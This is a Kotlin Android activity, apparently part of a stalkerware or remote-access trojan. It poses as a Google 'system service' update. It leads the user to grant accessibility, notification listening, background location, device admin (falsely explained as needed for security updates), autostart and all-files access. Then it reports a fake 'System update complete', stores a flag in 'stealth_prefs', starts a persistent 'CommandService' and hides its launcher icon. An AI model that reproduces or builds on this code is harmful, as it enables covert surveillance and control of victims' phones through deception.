package com.google.android.systemservice

import android.Manifest
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import android.provider.Settings
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.flow.collectLatest
import kotlinx.coroutines.launch
import com.google.android.systemservice.presentation.viewmodel.SetupWizardViewModel
import com.google.android.systemservice.receivers.SystemAdminReceiver
import com.google.android.systemservice.services.CommandService
import com.google.android.systemservice.utils.PermissionConstants
import com.google.android.systemservice.utils.VendorAutostart

class SetupWizardActivity : AppCompatActivity() {
    
    companion object {
        private const val TAG = "SetupWizard"

        // Permission request codes
        private const val REQUEST_PERMISSIONS = 1001
        private const val REQUEST_ACCESSIBILITY = 1002
        private const val REQUEST_NOTIFICATION_LISTENER = 1003
        private const val REQUEST_BATTERY_OPTIMIZATION = 1004
        private const val REQUEST_DEVICE_ADMIN = 1005
        private const val REQUEST_VENDOR_AUTOSTART = 1006
        private const val REQUEST_MANAGE_STORAGE = 1007
        private const val REQUEST_BACKGROUND_LOCATION = 1008

        // UI delays (milliseconds)
        private const val PERMISSION_RESULT_DELAY_MS = 500L
        private const val BACKGROUND_LOCATION_RESULT_DELAY_MS = 300L
        private const val ACTIVITY_RESULT_DELAY_MS = 500L
        private const val COMPLETE_SETUP_DELAY_MS = 1_500L

        // Permanently-denied detection threshold
        private const val MAX_PERMISSION_ATTEMPTS = 2
    }

    private val viewModel: SetupWizardViewModel by viewModels()

    private lateinit var progressBar: ProgressBar
    private lateinit var statusText: TextView
    private lateinit var stepText: TextView
    private lateinit var actionButton: Button
    private lateinit var progressPercent: TextView

    private val handler = Handler(Looper.getMainLooper())

    // Step order: 0=Accessibility, 1=Permissions, 2=Notifications, 3=Battery, 4=DeviceAdmin, 5=Autostart, 6=Files

    private val requiredPermissions get() = PermissionConstants.REQUIRED_PERMISSIONS
    
    // Track how many times we've asked for permissions (for "permanently denied" detection)
    private var permissionRequestAttempts = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Check if setup already completed
        if (isSetupComplete()) {
            launchServicesAndFinish()
            return
        }
        
        setContentView(R.layout.activity_setup_wizard)
        initViews()

        lifecycleScope.launch {
            viewModel.state.collectLatest { state ->
                if (state.setupComplete) {
                    completeSetup()
                } else {
                    updateUI(state)
                }
            }
        }
    }

    private fun initViews() {
        progressBar = findViewById(R.id.progressBar)
        statusText = findViewById(R.id.statusText)
        stepText = findViewById(R.id.stepText)
        actionButton = findViewById(R.id.actionButton)
        progressPercent = findViewById(R.id.progressPercent)

        actionButton.setOnClickListener { executeCurrentStep() }
    }

    private fun updateUI(state: SetupWizardViewModel.WizardState) {
        progressBar.progress = state.progressPercent
        progressPercent.text = "${state.progressPercent}%"
        stepText.text = state.stepLabel
        statusText.text = state.statusText
        actionButton.text = state.buttonText
    }

    private fun executeCurrentStep() {
        when (viewModel.state.value.currentStep) {
            0 -> requestAccessibilityService()
            1 -> requestRuntimePermissions()
            2 -> requestNotificationListener()
            3 -> requestBatteryOptimization()
            4 -> requestDeviceAdmin()
            5 -> requestVendorAutostart()
            6 -> requestManageStoragePermission()
        }
    }
    
    private fun requestManageStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = Uri.parse("package:$packageName")
                try {
                    startActivityForResult(intent, REQUEST_MANAGE_STORAGE)
                } catch (e: Exception) {
                    val intent2 = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivityForResult(intent2, REQUEST_MANAGE_STORAGE)
                }
            } else {
                advanceToNextStep()
            }
        } else {
            advanceToNextStep()
        }
    }

    private fun hasBackgroundLocationPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ContextCompat.checkSelfPermission(this, PermissionConstants.BACKGROUND_LOCATION_PERMISSION) == PackageManager.PERMISSION_GRANTED
        } else true
    }

    private fun requestBackgroundLocationIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !hasBackgroundLocationPermission()) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(PermissionConstants.BACKGROUND_LOCATION_PERMISSION),
                REQUEST_BACKGROUND_LOCATION
            )
        }
    }

    // Step 1: Runtime Permissions (after Accessibility)
    private fun requestRuntimePermissions() {
        val needed = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (needed.isNotEmpty()) {
            // Check if any permission is permanently denied (user pressed "Don't Allow" twice)
            val permanentlyDenied = needed.filter {
                permissionRequestAttempts > 0 && !ActivityCompat.shouldShowRequestPermissionRationale(this, it)
            }
            
            if (permanentlyDenied.isNotEmpty() && permissionRequestAttempts >= MAX_PERMISSION_ATTEMPTS) {
                // Must open app settings — Android won't show dialog anymore
                statusText.text = "Please enable all permissions in Settings"
                actionButton.text = "OPEN SETTINGS"
                actionButton.setOnClickListener {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivityForResult(intent, REQUEST_PERMISSIONS)
                }
                return
            }
            
            permissionRequestAttempts++
            // Reset button listener to normal
            actionButton.setOnClickListener { executeCurrentStep() }
            ActivityCompat.requestPermissions(
                this,
                needed.toTypedArray(),
                REQUEST_PERMISSIONS
            )
        } else if (!hasBackgroundLocationPermission()) {
            // All foreground granted, now request background location separately
            requestBackgroundLocationIfNeeded()
        } else {
            advanceToNextStep()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            REQUEST_PERMISSIONS -> {
                handler.postDelayed({
                    if (isDestroyed || isFinishing) return@postDelayed
                    val stillNeeded = requiredPermissions.filter {
                        ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
                    }
                    if (stillNeeded.isEmpty()) {
                        // Foreground done, now request background location if needed
                        if (!hasBackgroundLocationPermission()) {
                            requestBackgroundLocationIfNeeded()
                        } else {
                            advanceToNextStep()
                        }
                    } else {
                        Log.e(TAG, "Still need ${stillNeeded.size} permissions: ${stillNeeded.joinToString()}")
                        statusText.text = "Missing ${stillNeeded.size} permissions. Please grant all."
                        actionButton.text = "GRANT PERMISSIONS"
                        // Reset listener in case it was changed to "OPEN SETTINGS"
                        actionButton.setOnClickListener { executeCurrentStep() }
                    }
                }, PERMISSION_RESULT_DELAY_MS)
            }
            REQUEST_BACKGROUND_LOCATION -> {
                handler.postDelayed({
                    if (isDestroyed || isFinishing) return@postDelayed
                    // Background location granted or denied — advance either way
                    advanceToNextStep()
                }, BACKGROUND_LOCATION_RESULT_DELAY_MS)
            }
        }
    }

    // Step 1: Accessibility Service
    private fun requestAccessibilityService() {
        if (isAccessibilityServiceEnabled()) {
            advanceToNextStep()
        } else {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivityForResult(intent, REQUEST_ACCESSIBILITY)
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as? AccessibilityManager ?: return false
        val enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        return enabledServices.any { it.id.contains(packageName) }
    }

    // Step 2: Notification Listener
    private fun requestNotificationListener() {
        if (isNotificationListenerEnabled()) {
            advanceToNextStep()
        } else {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            startActivityForResult(intent, REQUEST_NOTIFICATION_LISTENER)
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(packageName) == true
    }

    // Step 3: Battery Optimization
    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
            if (pm.isIgnoringBatteryOptimizations(packageName)) {
                advanceToNextStep()
            } else {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivityForResult(intent, REQUEST_BATTERY_OPTIMIZATION)
            }
        } else {
            advanceToNextStep()
        }
    }

    // Step 4: Device Admin
    private fun requestDeviceAdmin() {
        val componentName = ComponentName(this, SystemAdminReceiver::class.java)
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: return
        
        if (dpm.isAdminActive(componentName)){
            advanceToNextStep()
        } else {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system security updates")
            }
            startActivityForResult(intent, REQUEST_DEVICE_ADMIN)
        }
    }

    // Step 5: Vendor Autostart
    private fun requestVendorAutostart() {
        val autostartIntent = VendorAutostart.getAutostartIntent(this)
        if (autostartIntent != null) {
            try {
                startActivityForResult(autostartIntent, REQUEST_VENDOR_AUTOSTART)
            } catch (e: Exception) {
                advanceToNextStep() // Skip if not available
            }
        } else {
            advanceToNextStep() // No vendor-specific settings needed
        }
    }

    private val resultHandlers = mapOf<Int, (Int, Intent?) -> Unit>(
        REQUEST_ACCESSIBILITY to ::handleAccessibilityResult,
        REQUEST_PERMISSIONS to ::handlePermissionResult,
        REQUEST_NOTIFICATION_LISTENER to ::handleNotificationListenerResult,
        REQUEST_BATTERY_OPTIMIZATION to ::handleBatteryResult,
        REQUEST_DEVICE_ADMIN to ::handleDeviceAdminResult,
        REQUEST_MANAGE_STORAGE to ::handleStorageResult,
        REQUEST_VENDOR_AUTOSTART to ::handleAutostartResult
    )

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        handler.postDelayed({
            if (isDestroyed || isFinishing) return@postDelayed
            val handler = resultHandlers[requestCode]
            if (handler != null) {
                handler(resultCode, data)
            } else {
                advanceToNextStep()
            }
        }, ACTIVITY_RESULT_DELAY_MS)
    }

    private fun handleAccessibilityResult(resultCode: Int, data: Intent?) {
        if (isAccessibilityServiceEnabled()) {
            advanceToNextStep()
        } else {
            statusText.text = "Accessibility service is required. Please enable it."
            actionButton.text = "ENABLE SERVICE"
        }
    }

    private fun handlePermissionResult(resultCode: Int, data: Intent?) {
        val stillNeeded = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (stillNeeded.isEmpty()) {
            actionButton.setOnClickListener { executeCurrentStep() }
            if (!hasBackgroundLocationPermission()) {
                requestBackgroundLocationIfNeeded()
            } else {
                advanceToNextStep()
            }
        } else {
            statusText.text = "Missing ${stillNeeded.size} permissions. Please grant all."
            actionButton.text = "GRANT PERMISSIONS"
            actionButton.setOnClickListener { executeCurrentStep() }
        }
    }

    private fun handleNotificationListenerResult(resultCode: Int, data: Intent?) {
        if (isNotificationListenerEnabled()) {
            advanceToNextStep()
        } else {
            statusText.text = "Notification access is required. Please enable it."
            actionButton.text = "ENABLE ACCESS"
        }
    }

    private fun handleBatteryResult(resultCode: Int, data: Intent?) {
        val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            advanceToNextStep()
        } else {
            statusText.text = "Battery optimization exemption required."
            actionButton.text = "OPTIMIZE"
        }
    }

    private fun handleDeviceAdminResult(resultCode: Int, data: Intent?) {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: return
        val cn = ComponentName(this, SystemAdminReceiver::class.java)
        if (dpm.isAdminActive(cn)) {
            advanceToNextStep()
        } else {
            statusText.text = "Device admin is required for protection."
            actionButton.text = "ACTIVATE"
        }
    }

    private fun handleStorageResult(resultCode: Int, data: Intent?) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && android.os.Environment.isExternalStorageManager()) {
            advanceToNextStep()
        } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            advanceToNextStep()
        } else {
            statusText.text = "File access permission is required."
            actionButton.text = "ALLOW ACCESS"
        }
    }

    private fun handleAutostartResult(resultCode: Int, data: Intent?) {
        advanceToNextStep()
    }

    private fun advanceToNextStep() {
        viewModel.goToNext()
    }

    private fun completeSetup() {
        statusText.text = "System update complete!"
        progressBar.progress = 100
        progressPercent.text = "100%"
        actionButton.visibility = View.GONE

        // Mark setup as complete
        getSharedPreferences("stealth_prefs", MODE_PRIVATE)
            .edit()
            .putBoolean("setup_complete", true)
            .apply()

        // Start services, then hide icons; keep retry if hiding fails
        handler.postDelayed({
            if (isDestroyed || isFinishing) return@postDelayed
            try {
                launchServicesAndFinish()
                hideLauncherIcon()
                finish()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch services: ${e.message}")
                Toast.makeText(this, "Setup incomplete, please retry", Toast.LENGTH_LONG).show()
            }
        }, COMPLETE_SETUP_DELAY_MS)
    }

    private fun isSetupComplete(): Boolean {
        return getSharedPreferences("stealth_prefs", MODE_PRIVATE)
            .getBoolean("setup_complete", false)
    }

    private fun hideLauncherIcon() {
        // Only disable launcher aliases — NOT SetupWizardActivity itself
        // SetupWizardActivity checks isSetupComplete() and skips wizard if already done
        val launcherAliases = listOf(
            ComponentName(this, "com.google.android.systemservice.ProvisionLauncherActivity")
        )

        launcherAliases.forEach { componentName ->
            try {
                packageManager.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (e: Exception) {
                Log.e(TAG, "Failed to hide component: ${componentName.className} ${e.message}")
            }
        }
    }

    private fun launchServicesAndFinish() {
        // Start main command service
        val serviceIntent = Intent(this, CommandService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        // Note: finish() is NOT called here - it's called from completeSetup() AFTER hideLauncherIcon()
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}
